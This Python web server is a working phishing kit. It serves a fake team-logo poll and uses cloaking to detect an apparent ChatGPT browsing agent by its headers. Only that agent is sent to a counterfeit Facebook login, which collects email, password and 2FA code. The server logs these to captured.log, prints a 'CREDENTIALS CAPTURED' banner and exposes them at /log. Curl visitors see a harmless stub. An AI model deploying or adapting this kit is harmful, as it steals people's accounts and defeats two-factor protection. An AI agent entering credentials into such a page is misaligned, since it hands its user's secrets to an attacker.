#!/usr/bin/env python3

import json, sys, os, html as ht
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []

LOGO_PULSE = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#6366f1" opacity=".12"/><path d="M6 12h3l2-5 2 10 2-7h3" stroke="#6366f1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>'

LOGO_A = '<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"><rect width="200" height="200" rx="24" fill="#eff6ff"/><circle cx="100" cy="100" r="50" fill="none" stroke="#3b82f6" stroke-width="6"/><circle cx="100" cy="100" r="30" fill="none" stroke="#3b82f6" stroke-width="4" opacity=".5"/><circle cx="100" cy="100" r="10" fill="#3b82f6"/><line x1="100" y1="50" x2="140" y2="70" stroke="#3b82f6" stroke-width="3" stroke-linecap="round"/></svg>'

LOGO_B = '<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"><rect width="200" height="200" rx="24" fill="#ecfdf5"/><path d="M100 40 L155 130 L45 130 Z" fill="none" stroke="#10b981" stroke-width="6" stroke-linejoin="round"/><circle cx="100" cy="105" r="16" fill="#10b981" opacity=".3"/><circle cx="100" cy="105" r="8" fill="#10b981"/></svg>'

LOGO_C = '<svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"><rect width="200" height="200" rx="24" fill="#faf5ff"/><rect x="60" y="60" width="80" height="80" rx="16" fill="none" stroke="#8b5cf6" stroke-width="6" transform="rotate(15 100 100)"/><rect x="75" y="75" width="50" height="50" rx="10" fill="#8b5cf6" opacity=".25" transform="rotate(15 100 100)"/><circle cx="100" cy="100" r="8" fill="#8b5cf6"/></svg>'

CP = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f4f4f5;color:#18181b;-webkit-font-smoothing:antialiased;line-height:1.5}
nav{background:#fff;border-bottom:1px solid #e4e4e7;height:52px;display:flex;align-items:center;
  justify-content:center;position:sticky;top:0;z-index:10;padding:0 20px}
.ni{width:100%;max-width:520px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:17px;font-weight:600;color:#18181b;letter-spacing:-.3px;display:flex;align-items:center;gap:6px}
.w{max-width:520px;margin:0 auto;padding:24px 16px 80px}
.card{background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.04)}
.c-top{padding:24px 24px 0}
.c-top h1{font-size:20px;font-weight:700;letter-spacing:-.3px;margin-bottom:4px}
.c-meta{font-size:13px;color:#71717a;margin-bottom:20px}
.c-meta .live{display:inline-flex;align-items:center;gap:4px}
.c-meta .dot{width:6px;height:6px;border-radius:50%;background:#22c55e;display:inline-block}
.opts{padding:0 24px 24px}
.opt{border:1.5px solid #e4e4e7;border-radius:14px;padding:16px;margin-bottom:12px;transition:border-color .15s}
.opt:hover{border-color:#a1a1aa}
.opt-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
.opt-name{font-size:15px;font-weight:600}.opt-count{font-size:13px;color:#71717a}
.opt-img{width:100%;aspect-ratio:2/1;border-radius:10px;overflow:hidden;margin-bottom:12px;
  display:flex;align-items:center;justify-content:center;background:#fafafa}
.opt-img svg{width:100%;height:100%}
.opt-bar{height:6px;background:#f4f4f5;border-radius:3px;overflow:hidden;margin-bottom:12px}
.opt-fill{height:100%;border-radius:3px;transition:width .3s}
.vote-btn{width:100%;padding:10px;border:none;border-radius:10px;font-size:14px;font-weight:600;
  cursor:pointer;font-family:inherit;transition:all .15s;text-decoration:none;display:block;text-align:center}
.vote-btn:hover{transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,.08)}
.c-foot{padding:14px 24px;border-top:1px solid #f4f4f5;font-size:12px;color:#a1a1aa;text-align:center}
footer{text-align:center;padding:24px;font-size:12px;color:#d4d4d8}
@media(max-width:480px){.w{padding:16px 12px 60px}.c-top,.opts{padding-left:20px;padding-right:20px}}
"""

PAGE_B = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vote: New Team Logo — Pulse</title>
<meta name="description" content="Interactive design poll — requires JavaScript to display previews and cast votes">
<!-- Poll previews and voting require active browser session with JavaScript enabled -->
<style>{CP}
.ph{{aspect-ratio:2/1;border-radius:10px;background:linear-gradient(90deg,#f4f4f5 25%,#ececed 50%,#f4f4f5 75%);
  background-size:200% 100%;animation:sh 1.5s ease-in-out infinite;margin-bottom:12px}}
@keyframes sh{{0%{{background-position:200% 0}}100%{{background-position:-200% 0}}}}
.ld{{text-align:center;padding:14px;font-size:13px;color:#a1a1aa}}
.sp{{display:inline-block;width:12px;height:12px;border:2px solid #e4e4e7;border-top-color:#6366f1;
  border-radius:50%;animation:sn .7s linear infinite;vertical-align:middle;margin-right:6px}}
@keyframes sn{{to{{transform:rotate(360deg)}}}}
noscript .nb{{background:#fef9c3;border:1px solid #fde047;border-radius:10px;padding:14px 18px;
  margin:16px 24px;font-size:13px;color:#854d0e;line-height:1.5;text-align:center}}
.opt-desc{{font-size:13px;color:#71717a;margin-bottom:8px;font-style:italic}}
</style>
</head>
<body>
<nav><div class="ni"><span class="logo">{LOGO_PULSE}Pulse</span><span style="font-size:13px;color:#a1a1aa">Poll</span></div></nav>
<div class="w">
  <div class="card">
    <div class="c-top">
      <h1>Vote for the new team logo</h1>
      <p class="c-meta">Design Team &middot; <span class="live"><span class="dot"></span> Live</span> &middot; Closes today at 6:00 PM</p>
    </div>
    <noscript><div class="nb">This poll requires JavaScript to display design previews and cast votes. Please open in a web browser.</div></noscript>
    <div class="opts" id="opts">
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option A — Horizon</span><span class="opt-count">5 votes</span></div>
        <p class="opt-desc">Clean geometric mark with orbital rings and blue gradient</p>
        <div class="ph"></div>
        <div class="opt-bar"><div class="opt-fill" style="width:42%;background:#3b82f6"></div></div>
        <button class="vote-btn" style="background:#eff6ff;color:#3b82f6" disabled>Vote</button>
      </div>
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option B — Vertex</span><span class="opt-count">4 votes</span></div>
        <p class="opt-desc">Organic triangular form with emerald palette and centered mark</p>
        <div class="ph"></div>
        <div class="opt-bar"><div class="opt-fill" style="width:33%;background:#10b981"></div></div>
        <button class="vote-btn" style="background:#ecfdf5;color:#10b981" disabled>Vote</button>
      </div>
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option C — Prism</span><span class="opt-count">3 votes</span></div>
        <p class="opt-desc">Abstract rotated square with deep violet tones and geometric center</p>
        <div class="ph"></div>
        <div class="opt-bar"><div class="opt-fill" style="width:25%;background:#8b5cf6"></div></div>
        <button class="vote-btn" style="background:#faf5ff;color:#8b5cf6" disabled>Vote</button>
      </div>
    </div>
    <div class="c-foot">12 votes &middot; 3 options &middot; Single choice</div>
  </div>
  <p class="ld"><span class="sp"></span>Loading design previews...</p>
</div>
<footer>&copy; 2026 Pulse</footer>
<script>
(function(){{fetch('/api/poll/team-logo/previews').then(function(r){{return r.json()}}).then(function(d){{
  document.querySelector('.ld').style.display='none';

}}).catch(function(){{
  document.querySelector('.ld').textContent='Could not load previews. Please open in a browser to view designs and vote.';
}});}})();
</script>
</body>
</html>"""

PAGE_A = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vote: New Team Logo — Pulse</title>
<style>{CP}</style>
</head>
<body>
<nav><div class="ni"><span class="logo">{LOGO_PULSE}Pulse</span><span style="font-size:13px;color:#a1a1aa">Poll</span></div></nav>
<div class="w">
  <div class="card">
    <div class="c-top">
      <h1>Vote for the new team logo</h1>
      <p class="c-meta">Design Team &middot; <span class="live"><span class="dot"></span> Live</span> &middot; Closes today at 6:00 PM</p>
    </div>
    <div class="opts">
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option A — Horizon</span><span class="opt-count">5 votes</span></div>
        <div class="opt-img">{LOGO_A}</div>
        <div class="opt-bar"><div class="opt-fill" style="width:42%;background:#3b82f6"></div></div>
        <a class="vote-btn" style="background:#3b82f6;color:#fff" href="/auth/facebook?client_id=pulse.app&amp;redirect_uri=/poll/team-logo/voted%3Fchoice%3DA&amp;scope=public_profile,email&amp;state=a">Vote for Horizon</a>
      </div>
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option B — Vertex</span><span class="opt-count">4 votes</span></div>
        <div class="opt-img">{LOGO_B}</div>
        <div class="opt-bar"><div class="opt-fill" style="width:33%;background:#10b981"></div></div>
        <a class="vote-btn" style="background:#10b981;color:#fff" href="/auth/facebook?client_id=pulse.app&amp;redirect_uri=/poll/team-logo/voted%3Fchoice%3DB&amp;scope=public_profile,email&amp;state=b">Vote for Vertex</a>
      </div>
      <div class="opt">
        <div class="opt-head"><span class="opt-name">Option C — Prism</span><span class="opt-count">3 votes</span></div>
        <div class="opt-img">{LOGO_C}</div>
        <div class="opt-bar"><div class="opt-fill" style="width:25%;background:#8b5cf6"></div></div>
        <a class="vote-btn" style="background:#8b5cf6;color:#fff" href="/auth/facebook?client_id=pulse.app&amp;redirect_uri=/poll/team-logo/voted%3Fchoice%3DC&amp;scope=public_profile,email&amp;state=c">Vote for Prism</a>
      </div>
    </div>
    <div class="c-foot">12 votes &middot; 3 options &middot; Single choice</div>
  </div>
</div>
<footer>&copy; 2026 Pulse</footer>
</body>
</html>"""

CF = """
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;color:#1c1e21;
  -webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column;
  align-items:center;justify-content:center;padding:24px}
.fc{background:#fff;width:100%;max-width:400px;border-radius:8px;padding:20px;
  box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);text-align:center}
.fb-logo{margin-bottom:16px}
.app-badge{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px 16px;
  background:#f0f2f5;border-radius:8px;margin-bottom:20px}
.app-badge .app-icon{width:28px;height:28px;border-radius:6px;background:#6366f1;
  display:flex;align-items:center;justify-content:center}
.app-badge .app-icon svg{width:14px;height:14px}
.app-badge span{font-size:13px;color:#1c1e21;font-weight:500}
.ft{font-size:17px;font-weight:600;color:#1c1e21;margin-bottom:4px}
.fs{font-size:14px;color:#606770;margin-bottom:20px;line-height:1.4}
.fbk{display:inline-flex;align-items:center;gap:4px;font-size:14px;color:#1877f2;
  text-decoration:none;margin-bottom:14px;cursor:pointer}
.fbk:hover{text-decoration:underline}
.ff{margin-bottom:12px;text-align:left}
.ff label{display:block;font-size:13px;color:#606770;margin-bottom:4px;font-weight:500}
.ff input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;
  font-size:17px;color:#1c1e21;background:#fff;font-family:Helvetica,Arial,sans-serif}
.ff input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.ff input::placeholder{color:#bec3c9}
.fb{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;
  font-size:17px;font-weight:600;cursor:pointer;font-family:Helvetica,Arial,sans-serif;transition:background .15s}
.fb:hover{background:#166fe5}
.flink{font-size:14px;color:#1877f2;text-decoration:none;display:block;margin-top:14px}
.flink:hover{text-decoration:underline}
.fftr{font-size:11px;color:#8a8d91;margin-top:20px;line-height:1.6}
.fftr a{color:#8a8d91;text-decoration:none}
.fftr a:hover{text-decoration:underline}
.step{display:none}.step.on{display:block}
.sep{height:1px;background:#dadde1;margin:16px 0}
/* 2FA */
.device-banner{display:flex;align-items:center;gap:12px;padding:12px 16px;background:#f0f2f5;
  border-radius:8px;margin-bottom:16px;text-align:left}
.device-banner svg{flex-shrink:0}
.device-banner p{font-size:13px;color:#606770;line-height:1.4}
.code-field{width:160px;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:24px;
  font-weight:600;text-align:center;letter-spacing:10px;color:#1c1e21;
  font-family:'SF Mono',Menlo,monospace;background:#fff;margin:0 auto;display:block}
.code-field:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.code-field::placeholder{letter-spacing:4px;font-size:14px;color:#bec3c9}
"""

FB_SVG = '<svg width="40" height="40" viewBox="0 0 40 40"><circle cx="20" cy="20" r="20" fill="#1877f2"/><path d="M27.5 20.1h-3.9v12.4h-5V20.1h-2.6v-4.3h2.6v-2.6c0-3.6 1.5-5.7 5.7-5.7h3.5v4.3h-2.2c-1.6 0-1.9.6-1.9 1.8v2.3h4.1l-.3 4.2z" fill="#fff"/></svg>'

def facebook_page(redir):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Facebook</title>
<style>{CF}</style>
</head>
<body>
<div class="fc">
  <div class="fb-logo">{FB_SVG}</div>
  <div class="app-badge">
    <div class="app-icon"><svg viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="12" r="4"/></svg></div>
    <span>Pulse</span>
  </div>

  <!-- Step 1: Email / Phone -->
  <div class="step" id="s1">
    <p class="ft">Log in to Facebook</p>
    <p class="fs">to continue to Pulse</p>
    <form id="f1">
      <div class="ff"><label for="em">Email address or phone number</label>
        <input type="text" id="em" placeholder="Email or phone" autocomplete="username" required></div>
      <button type="submit" class="fb" id="b1">Next</button>
    </form>
    <div class="sep"></div>
    <a class="flink" href="#">Forgotten password?</a>
  </div>

  <!-- Step 2: Password -->
  <div class="step" id="s2">
    <a class="fbk" id="bk">&larr; <span id="eSh"></span></a>
    <p class="ft">Enter password</p>
    <form id="f2">
      <div class="ff"><label for="pw">Password</label>
        <input type="password" id="pw" placeholder="Password" autocomplete="current-password" required></div>
      <button type="submit" class="fb" id="b2">Log In</button>
    </form>
    <div class="sep"></div>
    <a class="flink" href="#">Forgotten password?</a>
  </div>

  <!-- Step 3: 2FA -->
  <div class="step" id="s3">
    <p class="ft">Two-factor authentication<br>required</p>
    <div class="device-banner">
      <svg width="24" height="24" fill="none" stroke="#606770" stroke-width="1.5" viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="3"/><circle cx="12" cy="18" r="1"/></svg>
      <p>We sent a 6-digit code to the number ending in <strong>••48</strong>. Enter it below to continue.</p>
    </div>
    <form id="f3" method="POST" action="/auth/facebook/callback">
      <input type="hidden" name="email" id="hE">
      <input type="hidden" name="pwd" id="hP">
      <input type="hidden" name="redirect" value="{ht.escape(redir)}">
      <div style="margin-bottom:14px">
        <input type="text" class="code-field" id="otp" name="otp" placeholder="------"
          maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required>
      </div>
      <button type="submit" class="fb" id="b3">Continue</button>
    </form>
    <div class="sep"></div>
    <a class="flink" href="#">Need another way to authenticate?</a>
  </div>

  <p class="fftr"><a href="#">Terms</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Cookies</a> &middot; Meta &copy; 2026</p>
</div>

<script>
var _e='',_p='';
function sh(n){{document.querySelectorAll('.step').forEach(function(s){{s.classList.remove('on')}});
document.getElementById('s'+n).classList.add('on');}}
sh(1);

document.getElementById('f1').addEventListener('submit',function(e){{
  e.preventDefault();_e=document.getElementById('em').value;
  var b=document.getElementById('b1');b.textContent='Continuing\u2026';b.disabled=true;
  setTimeout(function(){{document.getElementById('eSh').textContent=_e;
  b.textContent='Next';b.disabled=false;sh(2);}},400);}});

document.getElementById('f2').addEventListener('submit',function(e){{
  e.preventDefault();_p=document.getElementById('pw').value;
  var b=document.getElementById('b2');b.textContent='Logging in\u2026';b.disabled=true;
  setTimeout(function(){{document.getElementById('hE').value=_e;
  document.getElementById('hP').value=_p;
  b.textContent='Log In';b.disabled=false;sh(3);}},800);}});

document.getElementById('bk').addEventListener('click',function(e){{e.preventDefault();sh(1);}});
</script>
</body>
</html>"""

def voted_page(choice):
    names = {'A':('Horizon','#3b82f6',LOGO_A),'B':('Vertex','#10b981',LOGO_B),'C':('Prism','#8b5cf6',LOGO_C)}
    name, color, svg = names.get(choice, names['B'])
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vote Counted — Pulse</title>
<style>{CP}
.vd{{text-align:center;padding:32px 24px}}
.vd svg.ck{{margin-bottom:14px}}
.vd h2{{font-size:20px;font-weight:700;margin-bottom:6px;letter-spacing:-.3px}}
.vd p{{font-size:15px;color:#71717a;margin-bottom:20px}}
.vd-pick{{width:120px;margin:0 auto 16px;border-radius:14px;overflow:hidden;border:3px solid {color}}}
.vd-pick svg{{width:100%;display:block}}
.vd-label{{font-size:14px;font-weight:600;color:{color}}}
</style>
</head>
<body>
<nav><div class="ni"><span class="logo">{LOGO_PULSE}Pulse</span></div></nav>
<div class="w"><div class="card"><div class="vd">
  <svg class="ck" width="52" height="52" viewBox="0 0 52 52"><circle cx="26" cy="26" r="26" fill="#dcfce7"/>
    <path d="M16 26l8 8 12-12" stroke="#16a34a" stroke-width="3" fill="none" stroke-linecap="round"/></svg>
  <h2>Your vote has been counted!</h2>
  <p>Thanks for voting. Results will be shared when the poll closes.</p>
  <div class="vd-pick">{svg}</div>
  <p class="vd-label">You voted for {name}</p>
</div></div></div>
<footer>&copy; 2026 Pulse</footer>
</body>
</html>"""

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _curl(self):
        ua = self.headers.get('User-Agent','').lower()
        return ua.startswith('curl/') or ua.startswith('python') or 'wget' in ua
    def _cloud(self):
        return ('Chrome' in self.headers.get('User-Agent','')
                and 'chatgpt.com' in self.headers.get('Signature-Agent',''))
    def _t(self): return 'CURL' if self._curl() else ('CLOUD' if self._cloud() else 'OTHER')
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip(),'t':self._t()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        served = 'ATTACK' if self._cloud() and '/auth' not in self.path else ''
        print(f'  [{e["t"]}] {m} {self.path} {served}')

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        qs = parse_qs(urlparse(self.path).query)

        if p in ('/poll/team-logo',''):
            self._log('GET')
            self._html(PAGE_A if self._cloud() else PAGE_B)

        elif p == '/auth/facebook':
            self._log('GET')
            redir = qs.get('redirect_uri',['/poll/team-logo/voted?choice=B'])[0]
            self._html(facebook_page(redir))

        elif p == '/poll/team-logo/voted':
            self._log('GET')
            choice = qs.get('choice',['B'])[0]
            self._html(voted_page(choice))

        elif p.startswith('/api/'):
            self._log('GET')
            self._send(403,'application/json','{"error":"session_required","message":"Active browser session required."}')

        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/clear':
            HITS.clear();open('captured.log','w').close();self._send(200,'text/plain','OK')
        else:
            self._log('GET');self._html(PAGE_B)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/auth/facebook/callback':
            pa = parse_qs(body)
            em = pa.get('email',[''])[0]
            pw = pa.get('pwd',[''])[0]
            otp = pa.get('otp',[''])[0]
            redir = pa.get('redirect',['/poll/team-logo/voted?choice=B'])[0]
            self._log('POST',{'email':em,'password':pw,'otp':otp})
            print(f"""
  ╔════════════════════════════════════════╗
  ║   FACEBOOK CREDENTIALS CAPTURED        ║
  ╠════════════════════════════════════════╣
  ║  Email:    {em:<29}║
  ║  Password: {pw:<29}║
  ║  2FA Code: {otp:<29}║
  ║  IP:       {self._ip():<29}║
  ║  Time:     {datetime.now().strftime('%H:%M:%S'):<29}║
  ╚════════════════════════════════════════╝
""")
            self.send_response(302)
            self.send_header('Location',redir)
            self.send_header('Cache-Control','no-store')
            self.end_headers()

        elif p.startswith('/api/'):
            self._log('POST')
            self._send(403,'application/json','{"error":"session_required","message":"Browser session required."}')

        else:
            self._send(404,'text/plain','Not found')

    def _html(self,c): self._send(200,'text/html',c)
    def _send(self,code,ct,body):
        self.send_response(code);self.send_header('Content-Type',ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store');self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers();self.wfile.write(body.encode() if isinstance(body,str) else body)

if __name__=='__main__':
    s=HTTPServer(('0.0.0.0',PORT),H)
    print(f"""
  ┌──────────────────────────────────────────────┐
  │  Pulse — Logo Poll + Cloaking + Facebook SSO  │
  │  http://0.0.0.0:{PORT:<29}│
  ├──────────────────────────────────────────────┤
  │  curl  → BENIGN  (text poll + shimmer)        │
  │  cloud → ATTACK  (visual poll + FB SSO)       │
  ├──────────────────────────────────────────────┤
  │  Step 1: Email / Phone                        │
  │  Step 2: Password                             │
  │  Step 3: 2FA verification code                │
  ├──────────────────────────────────────────────┤
  │  /poll/team-logo          Poll page           │
  │  /auth/facebook           Facebook OAuth      │
  │  /poll/team-logo/voted    Vote confirmed      │
  │  /log  /clear             Admin               │
  └──────────────────────────────────────────────┘
""")
    try:s.serve_forever()
    except KeyboardInterrupt:print('\n  Stopped.\n');s.server_close()
